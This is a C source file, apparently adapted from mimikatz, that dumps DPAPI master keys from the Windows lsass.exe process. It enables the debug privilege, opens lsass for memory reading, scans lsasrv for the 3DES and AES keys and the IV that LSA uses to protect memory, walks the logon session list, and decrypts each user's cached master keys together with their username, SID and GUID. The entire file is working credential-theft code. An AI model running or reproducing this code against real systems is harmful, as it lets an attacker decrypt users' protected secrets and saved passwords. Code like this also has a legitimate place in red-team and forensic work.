#include "dpapi.h"

BOOL GetPriVielge()
{
	BOOL result = FALSE;
	ULONG previousState;
	wchar_t UserName[MAX_PATH];
	DWORD len = MAX_PATH;
	NTSTATUS status;

	status = RtlAdjustPrivilege(20, TRUE, FALSE, &previousState);
	if (NT_SUCCESS(status))
		result = TRUE;
	GetUserNameW(UserName, &len);
	if (StrStrIW(UserName, L"system"))

		result = TRUE;

	return result;
}

BOOL GetProcessID(PDWORD pPrcessId)
{
	NTSTATUS status = STATUS_INFO_LENGTH_MISMATCH;
	PSYSTEM_PROCESS_INFORMATION buffer = NULL, tokenInfo;
	DWORD sizeOfBuffer;
	BOOL result = FALSE;

	for (sizeOfBuffer = 0x1000; (status == STATUS_INFO_LENGTH_MISMATCH) && (buffer = LocalAlloc(LPTR, sizeOfBuffer));)
	{
		status = NtQuerySystemInformation(SystemProcessInformation, buffer, sizeOfBuffer, &sizeOfBuffer);
		if (!NT_SUCCESS(status))
			LocalFree(buffer);
	}
	if (NT_SUCCESS(status))
	{
		for (tokenInfo = buffer; tokenInfo->NextEntryOffset; tokenInfo = (PSYSTEM_PROCESS_INFORMATION)((PBYTE)tokenInfo + tokenInfo->NextEntryOffset))
		{
			if (tokenInfo->ImageName.Length)
			{
				if (StrStrIW(tokenInfo->ImageName.Buffer, L"lsass.exe"))
				{
					*pPrcessId = PtrToUlong(tokenInfo->UniqueProcessId);
					result = TRUE;
					break;
				}
			}
		}
		LocalFree(buffer);
	}
	return result;
}

NTSTATUS LsaInitializeProtectedMemory()
{
	NTSTATUS status = STATUS_NOT_FOUND;
	ULONG dwSizeNeeded;


	status = BCryptOpenAlgorithmProvider(&k3Des.hProvider, BCRYPT_3DES_ALGORITHM, NULL, 0);
	if (NT_SUCCESS(status))
	{
		status = BCryptSetProperty(k3Des.hProvider, BCRYPT_CHAINING_MODE, (PBYTE)BCRYPT_CHAIN_MODE_CBC, sizeof(BCRYPT_CHAIN_MODE_CBC), 0);
		if (NT_SUCCESS(status))
		{
			status = BCryptGetProperty(k3Des.hProvider, BCRYPT_OBJECT_LENGTH, (PBYTE)&k3Des.cbKey, sizeof(k3Des.cbKey), &dwSizeNeeded, 0);
			if (NT_SUCCESS(status))
				k3Des.pKey = (PBYTE)LocalAlloc(LPTR, k3Des.cbKey);
		}
	}
	if (NT_SUCCESS(status))
	{
		status = BCryptOpenAlgorithmProvider(&kAes.hProvider, BCRYPT_AES_ALGORITHM, NULL, 0);
		if (NT_SUCCESS(status))
		{
			status = BCryptSetProperty(kAes.hProvider, BCRYPT_CHAINING_MODE, (PBYTE)BCRYPT_CHAIN_MODE_CFB, sizeof(BCRYPT_CHAIN_MODE_CFB), 0);
			if (NT_SUCCESS(status))
			{
				status = BCryptGetProperty(kAes.hProvider, BCRYPT_OBJECT_LENGTH, (PBYTE)&kAes.cbKey, sizeof(kAes.cbKey), &dwSizeNeeded, 0);
				if (NT_SUCCESS(status))
					kAes.pKey = (PBYTE)LocalAlloc(LPTR, kAes.cbKey);
			}
		}
	}
	return status;
}
void LsaCleanupProtectedMemory()
{
	if (k3Des.hProvider)
		BCryptCloseAlgorithmProvider(k3Des.hProvider, 0);
	if (k3Des.hKey)
	{
		BCryptDestroyKey(k3Des.hKey);
		LocalFree(k3Des.pKey);
	}

	if (kAes.hProvider)
		BCryptCloseAlgorithmProvider(kAes.hProvider, 0);
	if (kAes.hKey)
	{
		BCryptDestroyKey(kAes.hKey);
		LocalFree(kAes.pKey);
	}
}
void GetImageSize(HANDLE hProcess, PVOID ImageBase, PDWORD dwSize,PDWORD TimeDateStamp)
{
	IMAGE_DOS_HEADER dosHeader;
	PIMAGE_NT_HEADERS returnaddress;
	SIZE_T byteReaded;

	if (ReadProcessMemory(hProcess, ImageBase, &dosHeader, sizeof(IMAGE_DOS_HEADER), &byteReaded) && dosHeader.e_magic == IMAGE_DOS_SIGNATURE)
	{
		if (returnaddress = LocalAlloc(LPTR, sizeof(IMAGE_NT_HEADERS64)))
		{
			if (ReadProcessMemory(hProcess, (PBYTE)ImageBase + dosHeader.e_lfanew, returnaddress, sizeof(IMAGE_NT_HEADERS64), &byteReaded) && returnaddress->Signature == IMAGE_NT_SIGNATURE)
			{
				*dwSize = returnaddress->OptionalHeader.SizeOfImage;
				*TimeDateStamp = returnaddress->FileHeader.TimeDateStamp;
			}
			LocalFree(returnaddress);
		}
	}
}

BOOL GetModuleAddress(HANDLE hProcess)
{
	BOOL result = FALSE;
	PEB Peb; PEB_LDR_DATA LdrData; LDR_DATA_TABLE_ENTRY LdrEntry;
	PROCESS_BASIC_INFORMATION processInformations;
	ULONG szInfos;
	PBYTE aLire, fin;
	BOOL continueCallback = TRUE;
	PWSTR moduleName = NULL;
	DWORD i;

	if (NT_SUCCESS(NtQueryInformationProcess(hProcess, ProcessBasicInformation, &processInformations, sizeof(PROCESS_BASIC_INFORMATION), &szInfos)) && (szInfos == sizeof(PROCESS_BASIC_INFORMATION)) && processInformations.PebBaseAddress)
	{
		
		if (ReadProcessMemory(hProcess, processInformations.PebBaseAddress, &Peb, sizeof(Peb), NULL))
		{
			if (ReadProcessMemory(hProcess, Peb.Ldr, &LdrData, sizeof(LdrData), NULL))
			{
				
				for (
					aLire = (PBYTE)(LdrData.InMemoryOrderModulevector.Flink) - FIELD_OFFSET(LDR_DATA_TABLE_ENTRY, InMemoryOrderLinks),
					fin = (PBYTE)(Peb.Ldr) + FIELD_OFFSET(PEB_LDR_DATA, InLoadOrderModulevector);
					(aLire != fin) && continueCallback;
					aLire = (PBYTE)LdrEntry.InMemoryOrderLinks.Flink - FIELD_OFFSET(LDR_DATA_TABLE_ENTRY, InMemoryOrderLinks)
					)
				{
					if (continueCallback = ReadProcessMemory(hProcess, aLire, &LdrEntry, sizeof(LdrEntry), NULL))
					{
						
						if (moduleName = (PWSTR)LocalAlloc(LPTR, LdrEntry.BaseDllName.MaximumLength))
						{
							if (ReadProcessMemory(hProcess, LdrEntry.BaseDllName.Buffer, moduleName, LdrEntry.BaseDllName.MaximumLength, NULL))
							{

								for (i = 0; i < ARRAYSIZE(dllInfo); i++)
								{
									if (StrStrIW(moduleName, dllInfo[i].dllName))
									{

										dllInfo[i].ImageBase = LdrEntry.DllBase;
										GetImageSize(hProcess, dllInfo[i].ImageBase, &dllInfo[i].dwSizeOfImage, &dllInfo[i].TimeDateStamp);
										result = TRUE;
									}
								}
							}
							LocalFree(moduleName);
						}
					}
				}
			}
		}
		else wprintf(L"[*] ReadProcessMemory Failed %d\n", GetLastError());
	}

	return result;
}
PKULL_M_PATCH_GENERIC kull_m_patch_getGenericFromBuild(PKULL_M_PATCH_GENERIC generics, SIZE_T cbGenerics, DWORD BuildNumber)
{
	SIZE_T i;
	PKULL_M_PATCH_GENERIC current = NULL;

	for (i = 0; i < cbGenerics; i++)
	{
		if (generics[i].MinBuildNumber <= BuildNumber)
			current = &generics[i];
		else break;
	}
	return current;
}
BOOL searchmemory(HANDLE hProcess, LPVOID startAddress, PBYTE Pattern, SIZE_T length, LPVOID* address, DWORD sizeofImage)
{
	PBYTE tempaddress = NULL;
	BOOL status = FALSE;
	SIZE_T byteReaded;
	
	if (tempaddress = LocalAlloc(LPTR, sizeofImage))
	{
		if (ReadProcessMemory(hProcess, startAddress, tempaddress, sizeofImage, &byteReaded))
		{
			for (unsigned int i = 0; i < sizeofImage - length; i++)
			{
				if (RtlEqualMemory(tempaddress + i, Pattern, length))
				{
					*address = (PBYTE)startAddress + i;
					status = TRUE;
					break;
				}
			}
		}
		LocalFree(tempaddress);
	}
	return status;
}
BOOL utils_search(HANDLE hProcess, LPVOID dllBase, DWORD sizeofImage, PKULL_M_PATCH_GENERIC generics, SIZE_T cbGenerics, PVOID* genericPtr, PVOID* genericPtr1/*, PVOID* genericPtr2, PLONG genericOffset1*/)
{
	PKULL_M_PATCH_GENERIC currentReference;
	BOOL status = FALSE;
	LPVOID address, pAddress;
	LONG offset;


	if (currentReference = kull_m_patch_getGenericFromBuild(generics, cbGenerics, dwBuildNumber))
	{
		if (searchmemory(hProcess, dllBase, currentReference->Search.Pattern, currentReference->Search.Length, &address, sizeofImage))
		{
			pAddress = (PBYTE)address + currentReference->Offsets.off0;

			if (status = ReadProcessMemory(hProcess, pAddress, &offset, sizeof(LONG), NULL))
				*genericPtr = (PBYTE)pAddress + sizeof(LONG) + offset;

			if (genericPtr1)
			{

				pAddress = (PBYTE)address + currentReference->Offsets.off1;
				if (status = ReadProcessMemory(hProcess, pAddress, &offset, sizeof(LONG), NULL))
					*genericPtr1 = (PBYTE)pAddress + sizeof(LONG) + offset;
			}
		}
	}
	return status;
}
NTSTATUS GetKey(HANDLE hProcess, LPVOID address, PKIWI_BCRYPT_GEN_KEY pGenKey)
{
	LPVOID pAddress;
	PVOID buffer; SIZE_T taille; LONG offset;
	NTSTATUS status = STATUS_NOT_FOUND;
	KIWI_BCRYPT_HANDLE_KEY hKey;
	PKIWI_HARD_KEY pHardKey;
	LONG offset64;

	if (dwBuildNumber < KULL_M_WIN_MIN_BUILD_8)
	{
		taille = sizeof(KIWI_BCRYPT_KEY);
		offset = FIELD_OFFSET(KIWI_BCRYPT_KEY, hardkey);
	}
	else if (dwBuildNumber < KULL_M_WIN_MIN_BUILD_BLUE)
	{
		taille = sizeof(KIWI_BCRYPT_KEY8);
		offset = FIELD_OFFSET(KIWI_BCRYPT_KEY8, hardkey);
	}
	else
	{
		taille = sizeof(KIWI_BCRYPT_KEY81);
		offset = FIELD_OFFSET(KIWI_BCRYPT_KEY81, hardkey);
	}

	if (buffer = LocalAlloc(LPTR, taille))
	{
		if (ReadProcessMemory(hProcess, address, &offset64, sizeof(LONG), NULL))
		{
			address = (PBYTE)address + sizeof(LONG) + offset64;
			if (ReadProcessMemory(hProcess, address, &address, sizeof(PVOID), NULL))
			{
				if (ReadProcessMemory(hProcess, address, &hKey, sizeof(KIWI_BCRYPT_HANDLE_KEY), NULL) && hKey.tag == 'UUUR')
				{
					address = hKey.key;
					if (ReadProcessMemory(hProcess, address, buffer, taille, NULL) && ((PKIWI_BCRYPT_KEY)buffer)->tag == 'MSSK')
					{
						pHardKey = (PKIWI_HARD_KEY)((PBYTE)buffer + offset);
						if (pAddress = LocalAlloc(LPTR, pHardKey->cbSecret))
						{
							address = (PBYTE)hKey.key + offset + FIELD_OFFSET(KIWI_HARD_KEY, data);
							if (ReadProcessMemory(hProcess, address, pAddress, pHardKey->cbSecret, NULL))
							{
								status = BCryptGenerateSymmetricKey(pGenKey->hProvider, &pGenKey->hKey, pGenKey->pKey, pGenKey->cbKey, (PUCHAR)pAddress, pHardKey->cbSecret, 0);
							}
							LocalFree(pAddress);
						}
					}
				}
			}
		}
		LocalFree(buffer);
	}
	return status;
}
NTSTATUS GetKeys(HANDLE hProcess)
{
	NTSTATUS status = STATUS_NOT_FOUND;
	PKULL_M_PATCH_GENERIC currentReference;
	LPVOID address, pAddress;
	LONG offset64;

	if (currentReference = kull_m_patch_getGenericFromBuild(PTRN_WIN8_LsaInitializeProtectedMemory_KeyRef, ARRAYSIZE(PTRN_WIN8_LsaInitializeProtectedMemory_KeyRef), dwBuildNumber))
	{

		if (searchmemory(hProcess, dllInfo[0].ImageBase, currentReference->Search.Pattern, currentReference->Search.Length, &address, dllInfo[0].dwSizeOfImage))
		{
			pAddress = (PBYTE)address + currentReference->Offsets.off0;
			if (ReadProcessMemory(hProcess, pAddress, &offset64, sizeof(LONG), NULL))
			{
				pAddress = (PBYTE)pAddress + sizeof(LONG) + offset64;

				if (ReadProcessMemory(hProcess, pAddress, InitializationVector, sizeof(InitializationVector), NULL))
				{

					pAddress = (PBYTE)address + currentReference->Offsets.off1;

					status = GetKey(hProcess, pAddress, &k3Des);
					if (NT_SUCCESS(status))
					{
						pAddress = (PBYTE)address + currentReference->Offsets.off2;
						status = GetKey(hProcess, pAddress, &kAes);
					}
				}
			}
		}
	}
	return status;
}
NTSTATUS acquireLSA(HANDLE* hProcess)
{
	NTSTATUS status = STATUS_NOT_FOUND;
	DWORD lsassPid = 0;

	*hProcess = NULL;
	RtlGetNtVersionNumbers(&dwMajor, &dwMinor, &dwBuildNumber);
	dwBuildNumber &= 0x00007fff;
	if ((dwBuildNumber > KULL_M_WIN_MIN_BUILD_VISTA) && (dwMajor >= 6))
	{
		if (GetProcessID(&lsassPid))
		{
			*hProcess = OpenProcess(PROCESS_VM_READ | PROCESS_QUERY_LIMITED_INFORMATION, FALSE, lsassPid);
			if (*hProcess && *hProcess != INVALID_HANDLE_VALUE)
			{
				if (NT_SUCCESS(LsaInitializeProtectedMemory()))
				{
					if (GetModuleAddress(*hProcess))
					{
						if (utils_search(*hProcess, dllInfo[0].ImageBase, dllInfo[0].dwSizeOfImage, LsaSrvReferences, ARRAYSIZE(LsaSrvReferences), (PVOID*)&LogonSessionList, ((PVOID*)&LogonSessionListCount)))
						{
							status = GetKeys(*hProcess);
							if (!NT_SUCCESS(status))
								wprintf(L"[*] Key import %08x\n", status);
						}
					}
				}
			}
		}
	}
	return status;
}
NTSTATUS UnProtectMemory(PUCHAR pMemory, ULONG cbMemory)
{
	NTSTATUS status = STATUS_NOT_FOUND;
	BCRYPT_KEY_HANDLE* hKey;
	BYTE LocalInitializationVector[16];
	ULONG cbIV, cbResult;

	RtlCopyMemory(LocalInitializationVector, InitializationVector, sizeof(InitializationVector));
	if (cbMemory % 8)
	{
		hKey = &kAes.hKey;
		cbIV = sizeof(InitializationVector);
	}
	else
	{
		hKey = &k3Des.hKey;
		cbIV = sizeof(InitializationVector) / 2;
	}
	status = BCryptDecrypt(*hKey, pMemory, cbMemory, 0, LocalInitializationVector, cbIV, pMemory, cbMemory, &cbResult, 0);

	return status;
}
void AddMasterKey(PWSTR UserName,PWSTR sid, PWSTR guid, PBYTE key, DWORD dwKey, PLIST_ENTRY list)
{
	PMASTERKEY_LIST entry;
	if (UserName && guid && key)
	{
		if (entry = (PMASTERKEY_LIST)LocalAlloc(LPTR, sizeof(MASTERKEY_LIST)))
		{
			
			if ((entry->masterkey.UserName = LocalAlloc(LPTR, (wcslen(UserName) + 1) * sizeof(wchar_t))) 
				&& (entry->masterkey.guid = LocalAlloc(LPTR, (wcslen(guid) + 1) * sizeof(wchar_t)))
				&& (entry->masterkey.key = LocalAlloc(LPTR,dwKey))
				&& (entry->masterkey.sid = LocalAlloc(LPTR, (wcslen(sid) + 1) * sizeof(wchar_t)))
				)
			{
				wsprintfW(entry->masterkey.UserName, L"%ws", UserName);
				wsprintfW(entry->masterkey.guid, L"%ws", guid);
				wsprintfW(entry->masterkey.sid, L"%ws", sid);
				RtlCopyMemory(entry->masterkey.key, key, dwKey);
				entry->masterkey.keyLen = dwKey;
			}
			entry->navigator.Blink = list->Blink;
			entry->navigator.Flink = list;
			((PMASTERKEY_LIST)list->Blink)->navigator.Flink = (PLIST_ENTRY)entry;
			list->Blink = (PLIST_ENTRY)entry;
		}
	}

}

void Getdpapi(HANDLE hProcess, PVOID pLogonId, ULONG LogonType, PWSTR UserName, PWSTR sid, PLIST_ENTRY masterkeyEntry)
{
	PKIWI_MASTERKEY_CACHE_ENTRY pMasterKeyCacheList = NULL;
	LPVOID address;
	KIWI_MASTERKEY_CACHE_ENTRY mesCredentials;
	PBYTE buffer;
	PDLL_INFORMATION pPackage = (dwBuildNumber < KULL_M_WIN_MIN_BUILD_8) ? &dllInfo[0] : &dllInfo[1];
	UNICODE_STRING uString;

	if (LogonType != 3)
	{
		if (utils_search(hProcess, pPackage->ImageBase, pPackage->dwSizeOfImage, MasterKeyCacheReferences, ARRAYSIZE(MasterKeyCacheReferences), (PVOID*)&pMasterKeyCacheList, NULL))
		{
			address = pMasterKeyCacheList;
			if (ReadProcessMemory(hProcess, address, &mesCredentials, sizeof(LIST_ENTRY), NULL))
			{
				address = mesCredentials.Flink;
				while (address != pMasterKeyCacheList)
				{
					if (ReadProcessMemory(hProcess, address, &mesCredentials, sizeof(KIWI_MASTERKEY_CACHE_ENTRY), NULL))
					{
						if (SecEqualLuid(pLogonId, &mesCredentials.LogonId))
						{
							if (buffer = LocalAlloc(LPTR, mesCredentials.keySize))
							{
								address = (PBYTE)address + FIELD_OFFSET(KIWI_MASTERKEY_CACHE_ENTRY, key);
								if (ReadProcessMemory(hProcess, address, buffer, mesCredentials.keySize, NULL))
								{
									
									if (NT_SUCCESS(UnProtectMemory(buffer, mesCredentials.keySize)))
									{
										if (NT_SUCCESS(RtlStringFromGUID(&mesCredentials.KeyUid, &uString)))
										{
											AddMasterKey(UserName,sid, uString.Buffer, buffer, mesCredentials.keySize, masterkeyEntry);
											RtlFreeUnicodeString(&uString);
										}
									}
								}
								LocalFree(buffer);
							}
						}
						address = mesCredentials.Flink;
					}
					else break;
				}
			}
		}
	}

}
void getname(PUNICODE_STRING string, IN HANDLE hProcess, PWSTR* user)
{
	if (string->Length && (*user = LocalAlloc(LPTR, string->MaximumLength)))
	{
		ReadProcessMemory(hProcess, string->Buffer, *user, string->MaximumLength, NULL);

	}
}
void getsid(PSID* pSid,HANDLE hProcess,PWSTR* sid)
{
	PSID temp = NULL;
	BYTE nbAuth;
	DWORD sizeSid;
	if (ReadProcessMemory(hProcess, (PBYTE)*pSid + 1, &nbAuth, sizeof(BYTE), NULL))
	{
		sizeSid = 4 * nbAuth + 6 + 1 + 1;
		if (temp = LocalAlloc(LPTR, sizeSid))
		{
			if (ReadProcessMemory(hProcess, *pSid, temp, sizeSid, NULL))
				ConvertSidToStringSidW(temp, sid);
			LocalFree(temp);
		}
	}
}
BOOL GetMasterKey(PLIST_ENTRY masterkey)
{
	BOOL status = FALSE;
	HANDLE hLsass = NULL;
	const KUHL_M_SEKURLSA_ENUM_HELPER* helper;
	ULONG nbListes = 1, i;
	PVOID pStruct;
	PBYTE buffer;
	PLUID LogonId;
	ULONG LogonType;
	PWSTR UserName, sid;

	if (GetPriVielge())
	{
		if (NT_SUCCESS(acquireLSA(&hLsass)))
		{
			
			if (dwBuildNumber < KULL_M_WIN_MIN_BUILD_7)
				helper = &lsassEnumHelpers[0];
			else if (dwBuildNumber < KULL_M_WIN_MIN_BUILD_8)
				helper = &lsassEnumHelpers[1];
			else if (dwBuildNumber < KULL_M_WIN_MIN_BUILD_BLUE)
				helper = &lsassEnumHelpers[3];
			else
				helper = &lsassEnumHelpers[4];
			if ((dwBuildNumber >= KULL_M_WIN_MIN_BUILD_7) && (dwBuildNumber < KULL_M_WIN_MIN_BUILD_BLUE) && (dllInfo[0].TimeDateStamp > 0x53480000))
				helper++;

			if (LogonSessionListCount)
				ReadProcessMemory(hLsass, (PBYTE)LogonSessionListCount, &nbListes, sizeof(ULONG), NULL);

			for (i = 0; i < nbListes; i++)
			{
				if (ReadProcessMemory(hLsass, &LogonSessionList[i], &pStruct, sizeof(PVOID), NULL))
				{
					if (buffer = LocalAlloc(LPTR, helper->tailleStruct))
					{

						while ((pStruct != &LogonSessionList[i]))
						{
							UserName = NULL;
							sid = NULL;
							if (ReadProcessMemory(hLsass, pStruct, buffer, helper->tailleStruct, NULL))
							{
								LogonId = (PLUID)((PBYTE)buffer + helper->offsetToLuid);
								LogonType = *((PULONG)((PBYTE)buffer + helper->offsetToLogonType));


								getname((PUNICODE_STRING)((PBYTE)buffer + helper->offsetToUsername), hLsass, &UserName);
								getsid((PSID*)((PBYTE)buffer + helper->offsetToPSid), hLsass, &sid);
								Getdpapi(hLsass, LogonId, LogonType, UserName, sid, masterkey);


								if (UserName)
									LocalFree(UserName);
								if (sid)
									LocalFree(sid);
								pStruct = ((PLIST_ENTRY)buffer)->Flink;
								status = TRUE;
							}
							else break;
						}
						LocalFree(buffer);
					}
				}
			}

			CloseHandle(hLsass);
			LsaCleanupProtectedMemory();
		}
	}

	return status;
}